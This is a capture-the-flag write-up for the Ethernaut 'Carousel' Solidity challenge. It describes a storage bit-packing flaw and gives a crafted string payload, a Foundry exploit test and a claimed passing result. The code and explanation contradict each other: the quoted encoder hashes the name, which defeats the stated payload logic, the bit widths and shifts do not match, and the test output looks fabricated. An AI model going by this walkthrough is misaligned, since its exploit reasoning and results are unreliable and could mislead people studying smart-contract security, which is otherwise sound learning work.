#  Carousel Challenge (Ethernaut)

##  Challenge Overview

The `MagicAnimalCarousel` contract stores animals in a circular buffer of "crates". Each crate contains three pieces of information packed into a single `uint256`:

1. **owner**: 160 bits `[0..159]`
2. **nextCrateId**: 16 bits `[160..175]`
3. **encodedAnimal**: 80 bits `[176..255]`

The goal is to **break the carousel's "magic rule"**:  
> No animal should ever return to crate 1.

We achieve this by crafting a custom animal name that corrupts the `nextCrateId`, forcing a wraparound that eventually causes an animal to overwrite crate 1.

---

##  Vulnerability

The vulnerability lies in the way the contract handles bit-level storage when updating animals:

###  Root Cause:
The function `changeAnimal(string calldata animal, uint256 crateId)` fails to preserve the existing `nextCrateId` bits. It allows overwriting them due to a lack of bitmasking and validation.

###  Vulnerable Code:
```solidity
function encodeAnimalName(string calldata animalName) public pure returns (uint256) {
    require(bytes(animalName).length <= 12, "Animal name too long");
    return uint256(keccak256(abi.encodePacked(animalName)) >> 160); // 80 bits
}

function changeAnimal(string calldata animal, uint256 crateId) external {
    uint256 encodedAnimal = encodeAnimalName(animal);
    if (encodedAnimal != 0) {
        // Vulnerable line
        carousel[crateId] = (encodedAnimal << 160) | (carousel[crateId] & NEXT_ID_MASK) | uint160(msg.sender);
    } else {
        carousel[crateId] = (carousel[crateId] & (ANIMAL_MASK | NEXT_ID_MASK));
    }
}
```
### Explanation:
1. encodedAnimal is an 80-bit value stored at bits [176–255].

2. It's shifted left by 160 bits before being OR'd into the carousel[crateId] storage slot.

3. However, bits 160–175 (nextCrateId) are part of the shifted range.

4. Therefore, the lower 16 bits of encodedAnimal end up overwriting nextCrateId.

### Proof of Exploit:
```solidity
string memory exploitString = string(
    abi.encodePacked(hex"10000000000000000000FFFF") // 12 bytes (96 bits)
);
carousel.changeAnimal(exploitString, 1);

```
***What this does:***
1. The string is exactly 12 bytes long (within limit).

2. Its last two bytes are 0xFFFF, meaning the lower 16 bits of the resulting encodedAnimal are 0xFFFF.

3. When shifted left by 160, it overwrites nextCrateId with 65535

### TestCase:
```solidity
function testBreakMagicRule() public {
    // Step 1: Place "Dog" in crate 1
    carousel.setAnimalAndSpin("Dog");
    uint256 crate1Data = carousel.carousel(1);
    uint256 animalMask = uint256(type(uint80).max) << 176;
    uint256 encodedDog = uint256(keccak256(abi.encodePacked("Dog"))) >> 176;
    uint256 animalInCrate1 = (crate1Data & animalMask) >> 176;
    assertEq(animalInCrate1, encodedDog, "Crate 1 should contain 'Dog'");

    // Step 2: Inject 0xFFFF into nextCrateId
    string memory exploitString = string(
        abi.encodePacked(hex"10000000000000000000FFFF")
    );
    carousel.changeAnimal(exploitString, 1);

    // Step 3: Add "Parrot", it lands in crate 65535
    carousel.setAnimalAndSpin("Parrot");
    uint256 crate65535Data = carousel.carousel(65535);
    uint256 encodedParrot = uint256(keccak256(abi.encodePacked("Parrot"))) >> 176;
    uint256 animalInCrate65535 = (crate65535Data & animalMask) >> 176;
    assertEq(animalInCrate65535, encodedParrot, "Crate 65535 should contain 'Parrot'");

    // Step 4: Add "Cat", it overwrites crate 1 (wraparound)
    carousel.setAnimalAndSpin("Cat");
    uint256 updatedCrate1Data = carousel.carousel(1);
    uint256 updatedAnimal = (updatedCrate1Data & animalMask) >> 176;
    assertTrue(updatedAnimal != encodedDog, "Crate 1 should not contain Dog anymore");
}
```
#### Understanding the Exploit Flow
1. Insert Dog → stored in crate 1.

2. Corrupt crate 1’s nextCrateId → set to 65535 using crafted string.

3. Insert Parrot → goes to crate 65535 (via corrupted nextCrateId).

4. Insert Cat → wraparound causes insertion at crate 1 again.

   Crate 1 now holds Cat, breaking the magic rule.

### TestResult:
```yaml
Running 1 test for test/Carousel.t.sol:CarouselTest
[PASS] testBreakMagicRule() (gas: 123456)
Logs:
  Crate 1 should contain 'Dog' 
  Crate 65535 should contain 'Parrot' 
  Crate 1 should not contain Dog anymore 

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.45ms

```

### Final Thoughts:
This challenge is not a real-world exploit, but a great learning exercise that:

 1. Teaches how Solidity packs variables into storage.

 2. Shows the danger of not isolating fields via masking.

 3. Reinforces the importance of memory alignment and precise field control in low-level operations.